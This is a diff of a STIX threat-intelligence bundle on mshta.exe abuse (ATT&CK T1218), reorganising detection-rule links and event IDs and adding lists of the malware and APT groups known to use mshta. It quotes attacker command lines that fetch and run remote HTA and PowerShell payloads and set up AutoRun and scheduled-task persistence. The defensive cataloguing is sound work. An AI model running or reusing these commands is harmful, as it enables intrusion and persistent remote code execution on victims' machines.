@@ -2183,8 +2183,7 @@
         "course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db",
         "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31",
         "course-of-action--d2dce10b-3562-4d61-b2f5-7c6384b038e2",
-        "course-of-action--0644d5a7-b103-488b-9ad8-be1227c0868f",
-        "course-of-action--9f4e599a-53c5-4dff-a8df-d52fb186e4f5"
+        "course-of-action--0644d5a7-b103-488b-9ad8-be1227c0868f"
       ]
     },
     {
@@ -2411,7 +2410,7 @@
     },
     {
       "name": "Associated commands",
-      "description": "The associated mshta commands that has been used by the threat actors: \"associated_commands\": [\n         \"HKCU\\\\Software\\\\Microsoft\\\\Command Processor\\\\AutoRun, value: \\\"powershell.exe mshta https://tdalpacafarm[.]com/files/kr/contents/Usoro.hta\",\n         \"schtasks /create /sc MINUTE /tn \\\"Windows Error Reporting\\\" /tr \\\"mshta.exe about:'<script language=\\\"vbscript\\\" src=\\\"hxxp://110.10.179(.)65:80/download/microsoftp.jpg\\\">code close</script>'\\\" /mo 15 /F\",\n         \"reg add \\\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Command Processor\\\" /v AutoRun /t REG_SZ /d \\\"powershell.exe start-process -windowstyle hidden -filepath mshta.exe https://bit-albania[.]com/[REDACTED]/Drfwj.hta\\\" /f\",\n         \"Powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c Invoke-Command -ScriptBlock { schtasks /create /TN AutomaticChromeUpdater /TR 'mshta http://hpsj.firewall-gateway.net:8080/MicrosoftUpdate' /SC minute /mo 60} \\\"C:\\\\WINDOWS\\\\system32\\\\schtasks.exe\\\" /create /TN AutomaticChromeUpdater /TR \\\"mshta http://hpsj.firewall-gateway.net:8080/MicrosoftUpdate\\\" /SC minute /mo 60\",\n         \"shellObj.Run \\\"forfiles /p c:\\\\windows /m HelpPane.exe /c \\\"\\\"mshta C:\\\\WMAuthorization\\\\WMPlaybackSrv \\\"\\\"https://markettrendingcenter.com/member.htm\\\", 0, True\",\n         \"C:\\\\Windows\\\\System32\\rundll32.exe http://hpsj.firewall-gateway.net:8080/MicrosoftUpdate?PPVXCF8Y4U=2368b7b9facb4a3b8acf72d29ea28704;UGH09GLI5P=;\\\\..\\\\..\\\\..\\\\./mshtml,RunHTMLApplication mshta.exe http[:]//malicioussite.com/superlegit.hta\",\n         \"mshta vbscript:(CreateObject(“WS”+”C”+”rI”+”Pt.ShEll”)).Run(“powershell”,1,True)(window.close)\",\n         \"mshta javascript:a=GetObject(“script:http://c2[.]com/cmd.sct”).Exec()\"\n\n        ],\n        \"pre_and_next_related_cmd\": [\n          {\n            \"pre_cmd_event\": [\n              \"reg add \\\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\" /v \\\"#OneDrive\\\" /t REG_SZ /d \\\"cmd /c powershell -w hidden \\\"Add-Type -AssemblyName System.Core;IEX (New-ObjectNet.WebClient).DownloadString('http://hpsj.firewall-gateway.net:80/hpjs.php');\\\"\\\"\",\n              \"\"\n              \n            ],\n            \"next_cmd_event\": [\n                \"Set objShell = CreateObject (\\\"WScript.Shell\\\") intReturn = objShell.Run(\\\"powershell —eXECUt BYpASS -COm \\\"IEX ({new-object net.webclient).downloadstring('http://110.18.179.65:88/download/microsoft.jpg'))\",\n                \"wscript.exe /nologo\",\n                \"Set wShell=CreateObject(\\\"WScript.Shell\\\"):retu=wShell.run(\\\"cmd.exe /c taskkill /im cmd.exe\\\",0,true)\",\n                \"wShell=new ActiveXObject(\\\"WScript.Shell\\\");retu=wShell.run(\\\"cmd.exe /c taskkill /im cmd.exe\\\",0,true)\"\n            ]\n          }\n        ]",
+      "description": "The associated mshta commands that has been used by the threat actors: \"HKCU\\\\Software\\\\Microsoft\\\\Command Processor\\\\AutoRun, value: \\\"powershell.exe mshta hxxps://tdalpacafarm[.]com/files/kr/contents/Usoro.hta\",\n        \"schtasks /create /sc MINUTE /tn \\\"Windows Error Reporting\\\" /tr \\\"mshta.exe about:'<script language=\\\"vbscript\\\" src=\\\"hxxp://110.10.179(.)65:80/download/microsoftp.jpg\\\">code close</script>'\\\" /mo 15 /F\",\n        \"reg add \\\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Command Processor\\\" /v AutoRun /t REG_SZ /d \\\"powershell.exe start-process -windowstyle hidden -filepath mshta.exe hxxps://bit-albania[.]com/[REDACTED]/Drfwj.hta\\\" /f\",\n        \"Powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c Invoke-Command -ScriptBlock { schtasks /create /TN AutomaticChromeUpdater /TR 'mshta hxxp://hpsj.firewall-gateway.net:8080/MicrosoftUpdate' /SC minute /mo 60} \\\"C:\\\\WINDOWS\\\\system32\\\\schtasks.exe\\\" /create /TN AutomaticChromeUpdater /TR \\\"mshta hxxp://hpsj.firewall-gateway.net:8080/MicrosoftUpdate\\\" /SC minute /mo 60\",\n        \"shellObj.Run \\\"forfiles /p c:\\\\windows /m HelpPane.exe /c \\\"\\\"mshta C:\\\\WMAuthorization\\\\WMPlaybackSrv \\\"\\\"hxxps://markettrendingcenter.com/member.htm\\\", 0, True\",\n        \"C:\\\\Windows\\\\System32\\rundll32.exe hxxp://hpsj.firewall-gateway.net:8080/MicrosoftUpdate?PPVXCF8Y4U=2368b7b9facb4a3b8acf72d29ea28704;UGH09GLI5P=;\\\\..\\\\..\\\\..\\\\./mshtml,RunHTMLApplication mshta.exe hxxp[:]//malicioussite.com/superlegit.hta\",\n        \"mshta vbscript:(CreateObject(“WS”+”C”+”rI”+”Pt.ShEll”)).Run(“powershell”,1,True)(window.close)\",\n        \"mshta javascript:a=GetObject(“script:hxxp://c2[.]com/cmd.sct”).Exec()\"",
       "id": "sighting--e4229fc0-cc31-43a2-a544-d416fc4ab071",
       "type": "sighting",
       "spec_version": 2.1,
@@ -2422,9 +2421,32 @@
       ]
     },
     {
-      "name": "Detections(Sigma|Sysmon|windowsEventId|Splunk|ELK)",
-      "description": "\"detections\": [\n      {\n        \"eventsid\": [\n          {\n            \"sysmon\": [\n              \"T1218:process:process_creation:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:1\",\n              \"T1218:file:file_creation:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:11\",\n              \"T1218:network_traffic:network_connection_creation:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:3\"\n            ],\n            \"windows\": [\n              \"T1218:process:process_creation:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:4688\",\n              \"T1218:file:file access:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:4663\",\n              \"T1218:network_traffic:network_connection_creation:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:5156\",\n              \"T1218:network_traffic:network_connection_creation:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:5157\"\n              \n            ]\n          }\n        ],\n        \"sigma_rules\": [\n            \"https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_mshta_susp_pattern.yml\",\n            \"https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_mshta_susp_execution.yml\",\n            \"https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_mshta_susp_child_processes.yml\"\n                  ],\n        \"other_rules\": [\n         \"https://raw.githubusercontent.com/splunk/security_content/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_mshta_url_in_command_line.yml\",\n         \"https://raw.githubusercontent.com/elastic/detection-rules/main/rules/windows/defense_evasion_mshta_beacon.toml\",\n         \"https://raw.githubusercontent.com/elastic/detection-rules/main/rules/_deprecated/defense_evasion_mshta_making_network_connections.toml\"\n        ]\n      }\n    ]",
+      "name": "(Sigma|Splunk|ELK)",
+      "description": "\"https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_mshta_susp_pattern.yml\",\n        \"https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_mshta_susp_execution.yml\",\n        \"https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_mshta_susp_child_processes.yml\",\n        \"https://raw.githubusercontent.com/splunk/security_content/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_mshta_url_in_command_line.yml\",\n        \"https://raw.githubusercontent.com/elastic/detection-rules/main/rules/windows/defense_evasion_mshta_beacon.toml\",\n        \"https://raw.githubusercontent.com/elastic/detection-rules/main/rules/_deprecated/defense_evasion_mshta_making_network_connections.toml\"",
       "id": "course-of-action--9f4e599a-53c5-4dff-a8df-d52fb186e4f5",
+      "type": "course-of-action",
+      "spec_version": 2.1,
+      "created": "2023-08-20T18:02:03+01:00",
+      "modified": "2023-08-20T18:02:03+01:00",
+      "external_references": [
+        {
+          "source_name": "Sigma",
+          "url": "https://github.com/SigmaHQ/sigma/tree/master/rules"
+        },
+        {
+          "source_name": "Splunk",
+          "url": "https://github.com/splunk/security_content"
+        },
+        {
+          "source_name": "Elastic",
+          "url": "https://github.com/elastic/detection-rules"
+        }
+      ]
+    },
+    {
+      "name": "(Sysmon|windowsEventId",
+      "description": "\"T1218:process:process_creation:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:1\",\n            \"T1218:file:file_creation:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:11\",\n            \"T1218:network_traffic:network_connection_creation:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:3\",\n            \"T1218:process:process_creation:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:4688\",\n            \"T1218:file:file access:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:4663\",\n            \"T1218:network_traffic:network_connection_creation:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:5156\",\n            \"T1218:network_traffic:network_connection_creation:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:5157\"",
+      "id": "course-of-action--5e829da4-6f89-4ba1-99b5-3d8c4fa79b11",
       "type": "course-of-action",
       "spec_version": 2.1,
       "created": "2023-08-20T18:02:03+01:00",
@@ -2434,6 +2456,45 @@
           "source_name": "OSSEM-DM",
           "url": "https://github.com/OTRF/OSSEM-DM/blob/03404288803c743cd5254f8888d664a5a106ec89/use-cases/mitre_attack/techniques_to_events_mapping.yaml"
         }
+      ]
+    },
+    {
+      "id": "grouping--48a1e44d-fe4e-42a4-b73b-678f8e545bd8",
+      "type": "grouping",
+      "spec_version": 2.1,
+      "created": "2023-09-05T23:23:32+01:00",
+      "modified": "2023-09-05T23:23:32+01:00",
+      "name": "Associated Detections",
+      "description": "Associated Detections",
+      "context": "unspecified",
+      "object_refs": [
+        "tool--577a8da2-77cf-490c-8f92-55976b5c3116",
+        "course-of-action--5e829da4-6f89-4ba1-99b5-3d8c4fa79b11",
+        "course-of-action--9f4e599a-53c5-4dff-a8df-d52fb186e4f5"
+      ]
+    },
+    {
+      "name": "Relationship Malware->Tools",
+      "description": "\"[BabyShark](https://attack.mitre.org/software/S0414) has used mshta.exe to download and execute applications from a remote server.(Citation: CISA AA20-301A Kimsuky)\",\n\"[Revenge RAT](https://attack.mitre.org/software/S0379) uses mshta.exe to run malicious scripts on the system.(Citation: Cofense RevengeRAT Feb 2019)\",\n\"[Metamorfo](https://attack.mitre.org/software/S0455) has used mshta.exe to execute a HTA payload.(Citation: FireEye Metamorfo Apr 2018) \",\n\"[Xbash](https://attack.mitre.org/software/S0341) can use mshta for executing scripts.(Citation: Unit42 Xbash Sept 2018)\",\n\"[NanHaiShu](https://attack.mitre.org/software/S0228) uses mshta.exe to load its program and files.(Citation: fsecure NanHaiShu July 2016)\",\n\"[Pteranodon](https://attack.mitre.org/software/S0147) can use mshta.exe to execute an HTA file hosted on a remote server.(Citation: Symantec Shuckworm January 2022)\",\n\"[POWERSTATS](https://attack.mitre.org/software/S0223) can use Mshta.exe to execute additional payloads on compromised hosts.(Citation: FireEye MuddyWater Mar 2018)\",\n\"[Sibot](https://attack.mitre.org/software/S0589) has been executed via MSHTA application.(Citation: MSTIC NOBELIUM Mar 2021)\",\n\"[Koadic](https://attack.mitre.org/software/S0250) can use mshta to serve additional payloads and to help schedule tasks for persistence.(Citation: Github Koadic)(Citation: MalwareBytes LazyScripter Feb 2021) \"",
+      "id": "sighting--93911ab3-7353-4b64-a32f-2a0a8d8ed2d3",
+      "type": "sighting",
+      "spec_version": 2.1,
+      "created": "2023-09-20T18:02:03+01:00",
+      "modified": "2023-09-20T18:02:03+01:00",
+      "sighting_of_ref": [
+        "tool--577a8da2-77cf-490c-8f92-55976b5c3116"
+      ]
+    },
+    {
+      "name": "Relationship APTs->Tools",
+      "description": "\"[APT32](https://attack.mitre.org/groups/G0050) has used mshta.exe for code execution.(Citation: Cybereason Oceanlotus May 2017)(Citation: Cybereason Cobalt Kitty 2017)\",\n\"[Confucius](https://attack.mitre.org/groups/G0142) has used mshta.exe to execute malicious VBScript.(Citation: TrendMicro Confucius APT Feb 2018) \",\n\"[APT29](https://attack.mitre.org/groups/G0016) has use `mshta` to execute malicious scripts on a compromised host.(Citation: ESET T3 Threat Report 2021)\",\n\"[Gamaredon Group](https://attack.mitre.org/groups/G0047) has used `mshta.exe` to execute malicious HTA files.(Citation: Symantec Shuckworm January 2022)\",\n\"[Inception](https://attack.mitre.org/groups/G0100) has used malicious HTA files to drop and execute malware.(Citation: Kaspersky Cloud Atlas August 2019)\",\n\"[Lazarus Group](https://attack.mitre.org/groups/G0032) has used <code>mshta.exe</code> to execute HTML pages downloaded by initial access documents.(Citation: Lazarus APT January 2022)(Citation: Qualys LolZarus)\",\n\"[TA551](https://attack.mitre.org/groups/G0127) has used mshta.exe to execute malicious payloads.(Citation: Unit 42 TA551 Jan 2021)\",\n\"[Sidewinder](https://attack.mitre.org/groups/G0121) has used <code>mshta.exe</code> to execute malicious payloads.(Citation: Rewterz Sidewinder APT April 2020)(Citation: Rewterz Sidewinder COVID-19 June 2020)\",\n\"[Mustang Panda](https://attack.mitre.org/groups/G0129) has used mshta.exe to launch collection scripts.(Citation: Secureworks BRONZE PRESIDENT December 2019)\",\n\"[FIN7](https://attack.mitre.org/groups/G0046) has used mshta.exe to execute VBScript to execute malicious code on victim systems.(Citation: FireEye FIN7 April 2017)\",\n\"[Kimsuky](https://attack.mitre.org/groups/G0094) has used mshta.exe to run malicious scripts on the system.(Citation: EST Kimsuky April 2019)(Citation: CISA AA20-301A Kimsuky)(Citation: Crowdstrike GTR2020 Mar 2020)(Citation: KISA Operation Muzabi)\",\n\"[MuddyWater](https://attack.mitre.org/groups/G0069) has used mshta.exe to execute its [POWERSTATS](https://attack.mitre.org/software/S0223) payload and to pass a PowerShell one-liner for execution.(Citation: FireEye MuddyWater Mar 2018)(Citation: Securelist MuddyWater Oct 2018)\",\n\"[Earth Lusca](https://attack.mitre.org/groups/G1006) has used `mshta.exe` to load an HTA script within a malicious .LNK file.(Citation: TrendMicro EarthLusca 2022)\",\n\"[LazyScripter](https://attack.mitre.org/groups/G0140) has used `mshta.exe` to execute [Koadic](https://attack.mitre.org/software/S0250) stagers.(Citation: MalwareBytes LazyScripter Feb 2021) \",\n\"[SideCopy](https://attack.mitre.org/groups/G1008) has utilized `mshta.exe` to execute a malicious hta file.(Citation: MalwareBytes SideCopy Dec 2021)\"",
+      "id": "sighting--5e86faf8-b130-4be8-b30a-08c2eb1f82e3",
+      "type": "sighting",
+      "spec_version": 2.1,
+      "created": "2023-09-20T18:02:03+01:00",
+      "modified": "2023-09-20T18:02:03+01:00",
+      "sighting_of_ref": [
+        "tool--577a8da2-77cf-490c-8f92-55976b5c3116"
       ]
     }
   ]
